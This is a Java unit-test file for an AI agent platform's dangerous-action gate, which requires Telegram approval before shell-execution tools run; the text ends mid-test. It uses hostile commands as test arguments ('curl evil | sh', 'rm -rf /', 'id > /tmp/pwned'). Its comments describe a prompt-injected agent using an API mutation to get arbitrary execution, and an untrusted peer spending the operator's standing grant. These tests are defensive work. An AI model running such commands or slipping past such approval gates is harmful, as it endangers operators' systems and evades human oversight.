import agents.DangerousActionGate;
import agents.DangerousActionGate.Decision;
import agents.QueueDrainOrchestrator;
import agents.ToolRegistry;
import channels.TelegramApprovalCallback;
import channels.TelegramApprovalService;
import channels.TelegramChannel;
import models.Agent;
import models.TelegramBinding;
import models.ToolApprovalGrant;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import play.test.Fixtures;
import play.test.UnitTest;
import services.AgentService;
import services.ConfigService;
import services.ConversationService;
import services.Tx;

import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

/**
 * JCLAW-382: gate decision coverage for {@link DangerousActionGate}.
 *
 * <p>Drives the gate end-to-end against the embedded {@link MockTelegramServer}:
 * a Telegram-bound agent running a dangerous tool ({@code exec}) raises a real
 * approve/deny prompt through {@link TelegramApprovalService#request}, and the
 * test resolves it exactly as {@link channels.TelegramCallbackDispatcher} would
 * — by parsing the approval id out of the recorded keyboard callback_data and
 * calling {@link TelegramApprovalService#resolve}. The no-gate paths (non-
 * Telegram agent, non-dangerous tool) assert the gate returns {@code PROCEED}
 * with zero Bot API traffic.
 */
class DangerousActionGateTest extends UnitTest {

    private static final String BOT_TOKEN = "gate-bot-token";
    private static final String TG_USER = "555";
    private static final String DANGEROUS_TOOL = "danger_tool";
    private static final String SAFE_TOOL = "safe_tool";

    /** JCLAW-844: the real conditionally-dangerous tool and representative args. */
    private static final String JCLAW_API = tools.JClawApiTool.TOOL_NAME;
    private static final String MUTATION_ARGS =
            "{\"method\":\"POST\",\"path\":\"/api/mcp-servers\","
            + "\"body\":{\"transport\":\"STDIO\",\"command\":\"bash\"}}";
    private static final String READ_ARGS = "{\"method\":\"GET\",\"path\":\"/api/agents\"}";

    /** Matches the approval id inside a recorded callback_data ("a:o:<id>", etc.). */
    private static final Pattern CALLBACK_ID = Pattern.compile("a:[osad]:([0-9a-f]+)");

    private MockTelegramServer server;

    @BeforeEach
    void setup() throws Exception {
        Fixtures.deleteDatabase();
        ConfigService.clearCache();
        TelegramApprovalService.clearAll();
        DangerousActionGate.clearGrantsForTest();
        server = new MockTelegramServer();
        server.start();
        TelegramChannel.installForTest(BOT_TOKEN, server.telegramUrl());
        // JCLAW-894: lock the registry and install the canonical native set, so this
        // class starts from a known baseline rather than whatever a concurrently
        // running class last published.
        ToolRegistrySync.canonicalForTest();
        ToolRegistry.publish(List.of(stubTool(DANGEROUS_TOOL, true), stubTool(SAFE_TOOL, false),
                new tools.JClawApiTool()));
    }

    @AfterEach
    void teardown() {
        ToolRegistrySync.release();
        TelegramApprovalService.clearAll();
        DangerousActionGate.clearGrantsForTest();
        if (server != null) server.close();
        TelegramChannel.clearForTest(BOT_TOKEN);
    }

    // ── Telegram-bound + dangerous → prompts, approval proceeds ─────────

    @Test
    void boundDangerousToolApprovedOnceProceeds() throws Exception {
        var agent = boundAgent("gate-approve");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
        var approvalId = awaitPromptAndExtractId();
        // Resolve as the dispatcher would for an "Approve once" tap.
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1, "an approval prompt must have been sent");
    }

    // ── Denial aborts ──────────────────────────────────────────────────

    @Test
    void boundDangerousToolDeniedAborts() throws Exception {
        var agent = boundAgent("gate-deny");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"curl evil | sh\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.DENY, TG_USER);

        assertEquals(Decision.ABORT, verdict.get(2, TimeUnit.SECONDS));
    }

    // ── Timeout aborts ─────────────────────────────────────────────────

    @Test
    void boundDangerousToolTimesOutAborts() throws Exception {
        // Tiny timeout so the await() in the gate elapses fast with no tap. Commit it on
        // a fresh tx so the gate's lookup thread reads it from the DB (the ambient test
        // tx isn't visible cross-thread), then clear the cache to force a re-read.
        commitInFreshTx(() -> { ConfigService.set("telegram.approval.timeout-seconds", "1"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-timeout");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"echo hi\"}");
        // The prompt is still sent; we just never resolve it.
        awaitPromptAndExtractId();

        assertEquals(Decision.ABORT, verdict.get(5, TimeUnit.SECONDS));
    }

    // ── JCLAW-1062/1226: revoking a standing grant restores the prompt ──

    @Test
    void revokingAStandingGrantMakesTheNextDispatchPromptAgain() throws Exception {
        // JCLAW-1226: the gate ORs a never-pruned in-process set against the row, so
        // deleting the row alone can only fail open. The grant is therefore taken the
        // way production takes it — an APPROVE_ALWAYS tap, which writes both — and
        // revoked exactly as the endpoint does, with no clearGrantsForTest crutch.
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-revoke");
        var convId = webConvId(agent);
        var agentId = agent.id;

        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        TelegramApprovalService.resolve(awaitPromptAndExtractId(),
                TelegramApprovalCallback.Decision.APPROVE_ALWAYS, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));
        long promptsAfterGrant = server.countRequests("sendMessage");

        assertTrue(commitInFreshTx(() -> ToolApprovalGrant.exists(agentId, DANGEROUS_TOOL)),
                "the tap must have persisted the grant it is about to revoke");
        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}"),
                "a standing grant must suppress the prompt");
        assertEquals(promptsAfterGrant, server.countRequests("sendMessage"),
                "no approval prompt may be sent while the grant stands");

        commitInFreshTx(() -> ToolApprovalGrant.revoke(agentId, DANGEROUS_TOOL));
        DangerousActionGate.revokeGrant(agentId, DANGEROUS_TOOL);

        // The barrier is back: the dispatch now prompts instead of proceeding, and
        // a denial aborts it. awaitPromptAndExtractId times out if no prompt is sent.
        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        TelegramApprovalService.resolve(awaitPromptAndExtractId(),
                TelegramApprovalCallback.Decision.DENY, TG_USER);
        assertEquals(Decision.ABORT, verdict.get(2, TimeUnit.SECONDS),
                "after revoke the prompt governs again");
    }

    @Test
    void revokingEveryGrantForAnAgentClearsTheCache() throws Exception {
        // The agent-delete sweep: a session grant lives ONLY in the in-process set, so a
        // dispatch that proceeds after the rows are gone is proof the cache is the
        // suppressor — and that the delete cascade has to prune it by hand.
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-revoke-agent");
        var convId = webConvId(agent);

        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        TelegramApprovalService.resolve(awaitPromptAndExtractId(),
                TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));
        long promptsAfterGrant = server.countRequests("sendMessage");

        assertFalse(commitInFreshTx(() -> ToolApprovalGrant.exists(agent.id, DANGEROUS_TOOL)),
                "a session grant writes no row, so only the cache can be suppressing");
        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}"));
        assertEquals(promptsAfterGrant, server.countRequests("sendMessage"));

        DangerousActionGate.revokeGrantsForAgent(agent.id);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        TelegramApprovalService.resolve(awaitPromptAndExtractId(),
                TelegramApprovalCallback.Decision.DENY, TG_USER);
        assertEquals(Decision.ABORT, verdict.get(2, TimeUnit.SECONDS),
                "the per-agent sweep must prune the cache too");
    }

    // ── Non-dangerous tool → no gate, no prompt ────────────────────────

    @Test
    void boundSafeToolProceedsWithoutPrompt() {
        var agent = boundAgent("gate-safe");
        var convId = telegramConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, SAFE_TOOL, "{}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a non-dangerous tool must not raise an approval prompt");
    }

    // ── why-rationale elevation in the approval prompt ─────────────────

    @Test
    void extractWhyReturnsRationaleWhenPresent() {
        assertEquals("clear stale build output",
                DangerousActionGate.extractWhy(
                        "{\"command\":\"rm -rf build\",\"why\":\"clear stale build output\"}"));
    }

    @Test
    void extractWhyNullWhenAbsentBlankOrMalformed() {
        assertNull(DangerousActionGate.extractWhy("{\"command\":\"ls\"}"), "absent why → null");
        assertNull(DangerousActionGate.extractWhy("{\"command\":\"ls\",\"why\":\"   \"}"), "blank why → null");
        assertNull(DangerousActionGate.extractWhy("not json"), "malformed JSON → null");
        assertNull(DangerousActionGate.extractWhy("[1,2,3]"), "non-object JSON → null");
        assertNull(DangerousActionGate.extractWhy(null), "null args → null");
    }

    // ── Non-Telegram agent → no gate, no prompt ────────────────────────

    @Test
    void unboundAgentDangerousToolProceedsWithoutPrompt() {
        // Agent with no Telegram binding, on a web conversation. Under the
        // default off-channel policy (allow) it proceeds ungated, no prompt.
        var agent = unboundAgent("gate-unbound");
        var convId = webConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a non-Telegram conversation must not raise a Telegram approval prompt");
    }

    // ── JCLAW-423: a Telegram-bound agent on a WEB conversation must NOT
    //    route the approval to Telegram (the cross-channel bug). Under the
    //    default off-channel policy (allow) it proceeds ungated, no Bot traffic.
    @Test
    void boundAgentOnWebConversationDoesNotPromptTelegram() {
        var agent = boundAgent("gate-web-bound");
        var convId = webConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a web conversation must never raise a Telegram prompt, even on a Telegram-bound agent");
    }

    // ── JCLAW-423: tool.approval.offChannelPolicy=deny fails closed off Telegram. ──
    @Test
    void webConversationDenyPolicyAbortsDangerousTool() {
        // Commit the policy on a fresh tx so the gate reads it from the DB, then
        // clear the cache to force a re-read (same dance as the timeout test).
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-web-deny");
        var convId = webConvId(agent);

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf /\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "the deny policy must abort without any Telegram prompt");
    }

    // ── JCLAW-423: an explicit standing grant still proceeds under deny. ──
    @Test
    void webConversationDenyPolicyHonorsStandingGrant() {
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-web-deny-grant");
        var convId = webConvId(agent);
        commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL, "telegram", TG_USER); return null; });

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a standing grant proceeds even under the deny policy, with no prompt");
    }

    // ── JCLAW-709: tool.approval.offChannelPolicy=ask confirms on the bound
    //    Telegram DM even for a web-origin dangerous tool. ──
    @Test
    void webConversationAskPolicyConfirmsOnTelegramAndProceeds() throws Exception {
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-web-ask");
        var convId = webConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1,
                "the ask policy routes a Telegram prompt even for a web-origin dangerous tool");
    }

    // ── JCLAW-709: ask with no Telegram binding to confirm on fails closed. ──
    @Test
    void webConversationAskPolicyFailsClosedWithoutTelegramBinding() {
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = unboundAgent("gate-web-ask-unbound");
        var convId = webConvId(agent);

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "ask with no Telegram binding must fail closed, with no prompt");
    }

    // ── JCLAW-777 / VULN-001: an UNTRUSTED external channel peer (whatsapp, or a
    //    telegram/slack turn with no usable approval binding) must NOT run a
    //    dangerous tool ungated under the default off-channel policy. Only the
    //    trusted operator origin (web / no conversation) keeps the permissive
    //    default; every inbound channel peer fails closed. ──

    @Test
    void whatsappUntrustedOriginDeniesDangerousToolByDefault() {
        // Default off-channel policy is "allow" — but that permissive default exists
        // only for the operator's own web UI. An untrusted WhatsApp peer has no
        // interactive approval surface and no authenticated caller, so a dangerous
        // tool must fail closed rather than reach ShellExecTool's /bin/sh -c ungated.
        var agent = unboundAgent("gate-wa-default");
        var convId = whatsappConvId(agent);

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"id > /tmp/pwned\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "an untrusted whatsapp origin must not raise a Telegram prompt either");
    }

    @Test
    void whatsappUntrustedOriginDoesNotSpendAStandingGrant() {
        // JCLAW-1226: the grant is the operator's own approval, keyed only by (agent, tool).
        // Honouring it before the origin was resolved let an untrusted peer on a granted pair
        // reach an unsandboxed shell without the origin-trust branch ever running. The
        // operator's own use of the same grant is pinned by
        // webConversationDenyPolicyHonorsStandingGrant.
        var agent = unboundAgent("gate-wa-grant");
        var convId = whatsappConvId(agent);
        commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL, "telegram", TG_USER); return null; });

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"id > /tmp/pwned\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "an untrusted guest turn must not spend the operator's standing grant");
    }

    @Test
    void telegramConversationWithNoUsableBindingFailsClosed() {
        // A telegram-origin turn whose agent has no usable Telegram binding falls
        // through to the off-channel path. It is still an untrusted external peer, so
        // it must fail closed rather than proceed ungated (the pre-fix behavior).
        var agent = unboundAgent("gate-tg-nobinding");
        var convId = commitInFreshTx(() -> {
            Agent a = Agent.findById(agent.id);
            return ConversationService.create(a, "telegram", TG_USER).id;
        });

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"whoami\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a telegram turn with no bot to prompt on must fail closed, not run ungated");
    }

    @Test
    void whatsappUntrustedOriginAskPolicyConfirmsOnTelegramAndProceeds() throws Exception {
        // offChannelPolicy=ask lets the operator still authorize an untrusted-origin
        // dangerous tool by confirming on the agent's bound Telegram DM — the middle
        // ground between blanket allow and hard deny for untrusted peers.
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-wa-ask");
        var convId = whatsappConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1,
                "ask routes a Telegram confirmation even for an untrusted whatsapp origin");
    }

    @Test
    void nullConversationOriginFailsClosed() {
        // JCLAW-1021 inverts the JCLAW-777 reading of a null conversationId. Task /
        // scheduled runs drive the tool loop with no conversation, so "no origin" is
        // missing provenance, not the operator — an untrusted peer that fired a task
        // would otherwise reach the permissive branch. A fire that DID record its
        // origin gets it back through DangerousActionGate.withFireOrigin.
        var agent = unboundAgent("gate-null-origin");

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, null, DANGEROUS_TOOL, "{\"command\":\"echo task\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a context-less (task) origin must not raise a prompt");
    }

    // ── JCLAW-844: jclaw_api mutations route through the same origin gate as exec;
    //    reads (GET) and discover stay ungated on every origin. ──

    @Test
    void jclawApiReadOnUntrustedOriginProceedsUngated() {
        // A GET through jclaw_api is not a mutation, so even an untrusted whatsapp
        // origin proceeds with no prompt (read exposure is handled by masking, 780).
        var agent = unboundAgent("gate-jclaw-read");
        var convId = whatsappConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, JCLAW_API, READ_ARGS));
        assertEquals(0, server.countRequests("sendMessage"),
                "a jclaw_api GET must not gate on any origin");
    }

    @Test
    void jclawApiMutationOnWhatsappFailsClosed() {
        // The headline: a prompt-injected agent on whatsapp can no longer create a
        // STDIO MCP server (arbitrary exec) — the mutation fails closed like exec.
        var agent = unboundAgent("gate-jclaw-wa");
        var convId = whatsappConvId(agent);

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, JCLAW_API, MUTATION_ARGS));
        assertEquals(0, server.countRequests("sendMessage"),
                "an untrusted-origin jclaw_api mutation must fail closed, no prompt");
    }

    @Test
    void jclawApiMutationOnWebProceedsUngated() {
        // The operator's own web chat keeps full power: creating providers/MCP/bindings
        // via chat proceeds with no prompt (trusted operator origin).
        var agent = unboundAgent("gate-jclaw-web");
        var convId = webConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, JCLAW_API, MUTATION_ARGS));
        assertEquals(0, server.countRequests("sendMessage"),
                "a web-origin jclaw_api mutation proceeds unprompted");
    }

    @Test
    void jclawApiMutationOnBoundTelegramPromptsThenApproves() throws Exception {
        // From a bound Telegram DM the operator gets an in-chat approve/deny; on
        // Approve the mutation proceeds (not an ABORT).
        var agent = boundAgent("gate-jclaw-tg");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, JCLAW_API, MUTATION_ARGS);
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1,
                "a bound-Telegram jclaw_api mutation must raise an approve/deny prompt");
    }

    // ── Session/Always scope suppresses re-prompt ──────────────────────

    @Test
    void sessionApprovalSuppressesSecondPrompt() throws Exception {
        var agent = boundAgent("gate-session");
        var convId = telegramConvId(agent);

        // First call prompts and is approved for the session.
        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        long promptsAfterFirst = server.countRequests("sendMessage");

        // JCLAW-1226: only the operator may spend the grant, so the re-dispatch that must
        // not re-prompt is an owner-initiated one. Under deny, proceeding can only be the
        // grant — the policy would otherwise abort it.
        assertEquals(Decision.PROCEED, guardAsOwnerUnderDeny(agent, convId),
                "a session-approved tool must not re-prompt on the operator's next call");
        assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                "a session-approved tool must not re-prompt on its next call");
    }

    // ── JCLAW-385: APPROVE_ALWAYS persists + survives a "restart" ───────

    @Test
    void alwaysApprovalPersistsAndSuppressesSecondPromptAfterRestart() throws Exception {
        var agent = boundAgent("gate-always");
        var convId = telegramConvId(agent);

        // First call prompts and is approved "always".
        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ALWAYS, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        // A durable grant row must now exist (read on a committed tx like the gate does).
        assertTrue(commitInFreshTx(() -> ToolApprovalGrant.exists(agent.id, DANGEROUS_TOOL)),
                "APPROVE_ALWAYS must persist a ToolApprovalGrant row");

        long promptsAfterFirst = server.countRequests("sendMessage");

        // Simulate a JVM restart: the in-process session set is gone, only the DB row remains.
        DangerousActionGate.clearGrantsForTest();

        // Second call for the same (agent, tool) must proceed off the persisted grant, no new prompt.
        assertEquals(Decision.PROCEED, guardAsOwnerUnderDeny(agent, convId));
        assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                "a persisted always-grant must suppress the prompt after the in-process set is cleared");
    }

    @Test
    void sessionApprovalDoesNotPersistAndRePromptsAfterRestart() throws Exception {
        var agent = boundAgent("gate-session-volatile");
        var convId = telegramConvId(agent);

        // First call prompts and is approved for the session only.
        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        // A session grant must NOT write a durable row.
        assertFalse(commitInFreshTx(() -> ToolApprovalGrant.exists(agent.id, DANGEROUS_TOOL)),
                "APPROVE_SESSION must not persist a ToolApprovalGrant row");

        long promptsAfterFirst = server.countRequests("sendMessage");

        // Simulate a restart: with no persisted grant, the next call must re-prompt.
        DangerousActionGate.clearGrantsForTest();
        var second = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}");
        var secondId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(secondId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);
        assertEquals(Decision.PROCEED, second.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") > promptsAfterFirst,
                "a session-approved tool must re-prompt once the in-process set is cleared (no persisted grant)");
    }

    @Test
    void preSeededPersistedGrantSuppressesPromptWithNoBotCall() {
        var agent = boundAgent("gate-preseed");
        var convId = telegramConvId(agent);

        // Seed a durable always-grant on a committed tx, as a prior JVM would have left behind.
        commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL, "telegram", TG_USER); return null; });

        // No in-process grant exists for this fresh process; the gate must read the DB row.
        assertEquals(Decision.PROCEED, guardAsOwnerUnderDeny(agent, convId));
        assertEquals(0, server.countRequests("sendMessage"),
                "a pre-seeded persisted grant must suppress the prompt with no Bot API call");
    }

    // ── Helpers ─────────────────────────────────────────────────────────

    /** Run {@link DangerousActionGate#guard} on a separate thread so the test
     *  thread can resolve the (blocking) approval. */
    private java.util.concurrent.CompletableFuture<Decision> runGateAsync(
            Agent agent, Long convId, String tool, String args) {
        var future = new java.util.concurrent.CompletableFuture<Decision>();
        Thread.ofVirtual().start(() -> future.complete(DangerousActionGate.guard(agent, convId, tool, args)));
        return future;
    }

    /**
     * Dispatch as the binding owner with the off-channel policy at {@code deny}, so a
     * PROCEED can only come from a standing grant — owner-initiated alone resolves as the
     * operator surface, which {@code deny} then aborts.
     */
    private Decision guardAsOwnerUnderDeny(Agent agent, Long convId) {
        ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny");
        try {
            return DangerousActionGate.withOwnerInitiated(true,
                    () -> DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
        }
        finally {
            ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "allow");
        }
    }

    /** Poll the mock server until the approval prompt's sendMessage lands, then
     *  pull the approval id out of its inline-keyboard callback_data. */
    private String awaitPromptAndExtractId() throws InterruptedException {
        for (int i = 0; i < 200; i++) {
            // Return the first recorded prompt whose approval id is STILL pending.
            // Filtering by isPending INSIDE the stream is essential: a test with two
            // sequential prompts has the resolved first prompt in the list, so a plain
            // findFirst() would keep returning that (never-pending) one. It also closes
            // the race where request() sends the prompt just before registering PENDING.
            var match = server.requests().stream()
                    .filter(r -> r.method().equalsIgnoreCase("sendMessage"))
                    .map(r -> CALLBACK_ID.matcher(r.body()))
                    .filter(java.util.regex.Matcher::find)
                    .map(m -> m.group(1))
                    .filter(TelegramApprovalService::isPending)
                    .findFirst();
            if (match.isPresent()) {
                return match.get();
            }
            Thread.sleep(10);
        }
        throw new AssertionError("approval prompt with callback_data never arrived");
    }

    /** An agent with NO Telegram binding (web/Slack/unbound), committed cross-thread. */
    private Agent unboundAgent(String name) {
        return commitInFreshTx(() -> AgentService.create(name, "openrouter", "gpt-4.1"));
    }

    /** A committed Telegram conversation for {@code agent} (channelType="telegram"). */
    private Long telegramConvId(Agent agent) {
        return commitInFreshTx(() -> {
            Agent a = Agent.findById(agent.id);
            return ConversationService.create(a, "telegram", TG_USER).id;
        });
    }

    /** A committed web conversation for {@code agent} — no Telegram approval surface. */
    private Long webConvId(Agent agent) {
        return commitInFreshTx(() -> {
            Agent a = Agent.findById(agent.id);
            return ConversationService.create(a, "web", null).id;
        });
    }

    /** A committed WhatsApp conversation for {@code agent} — an untrusted external peer. */
    private Long whatsappConvId(Agent agent) {
        return commitInFreshTx(() -> {
            Agent a = Agent.findById(agent.id);
            return ConversationService.create(a, "whatsapp", "15551234567").id;
        });
    }

    private Agent boundAgent(String name) {
        // Seed the agent + binding on a fresh COMMITTED tx (not the ambient test
        // tx, which doesn't commit cross-thread): the gate resolves the binding on
        // its own virtual thread, so it must see the row. Same constraint as the
        // commitInFreshTx pattern used by the HTTP functional tests.
        return commitInFreshTx(() -> {
            var agent = AgentService.create(name, "openrouter", "gpt-4.1");
            var b = new TelegramBinding();
            b.agent = agent;
            b.botToken = BOT_TOKEN;
            b.telegramUserId = TG_USER;
            b.enabled = true;
            b.save();
            return agent;
        });
    }

    private static <T> T commitInFreshTx(java.util.function.Supplier<T> block) {
        var ref = new java.util.concurrent.atomic.AtomicReference<T>();
        var err = new java.util.concurrent.atomic.AtomicReference<Throwable>();
        var t = Thread.ofPlatform().start(() -> {
            try { ref.set(Tx.run(block::get)); }
            catch (Throwable ex) { err.set(ex); }
        });
        try { t.join(); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new RuntimeException(e); }
        if (err.get() != null) throw new RuntimeException(err.get());
        return ref.get();
    }

    private static ToolRegistry.Tool stubTool(String toolName, boolean dangerous) {
        return new ToolRegistry.Tool() {
            @Override public String name() { return toolName; }
            @Override public String description() { return "stub for the gate test"; }
            @Override public Map<String, Object> parameters() {
                return Map.of("type", "object", "properties", Map.of());
            }
            @Override public boolean dangerous() { return dangerous; }
            @Override public String execute(String argsJson, Agent agent) { return "ran " + toolName; }
        };
    }

    // ── JCLAW-1061: the prompt asks "is this really you?"; skip it when the channel
    //    already answered. ──

    @Test
    void ownerInitiatedTurnSkipsThePromptEntirely() {
        // TelegramAccessPolicy serves a DM only to the binding owner, so by the time a turn
        // reaches the gate that question is settled. Asking again is noise, not defence.
        var agent = boundAgent("gate-owner-initiated");
        var convId = telegramConvId(agent);

        var decision = DangerousActionGate.withOwnerInitiated(true,
                () -> DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL,
                        "{\"command\":\"echo mine\"}"));

        assertEquals(Decision.PROCEED, decision);
        assertEquals(0, server.countRequests("sendMessage"),
                "the operator's own request must not raise a prompt at them");
    }

    @Test
    void aGuestOnTheSameBindingStillPrompts() throws Exception {
        // The other half, and the reason this is not a blanket switch: a mention-gated guest
        // in a Telegram group reaches the same agent and binding, and must still be gated.
        var agent = boundAgent("gate-guest-initiated");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"echo theirs\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1,
                "a non-owner turn must still raise the prompt");
    }

    @Test
    void unboundMeansNotTheOwner() throws Exception {
        // Fail-closed polarity: a channel that cannot identify its sender binds nothing, so it
        // keeps prompting. This is why WhatsApp needs no owner check for this to be safe.
        var agent = boundAgent("gate-owner-unbound");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"echo unknown\"}");
        assertNotNull(awaitPromptAndExtractId(),
                "with nothing bound the turn is not the owner's and must prompt");
        verdict.cancel(true);
    }

    @Test
    void ownerInitiatedStillHonorsAnExplicitDenyPolicy() {
        // Owner-initiated resolves AS the operator surface rather than bypassing the gate, so
        // an operator who set the policy to deny still gets deny — the setting keeps meaning
        // what the Tool Approvals panel says it means.
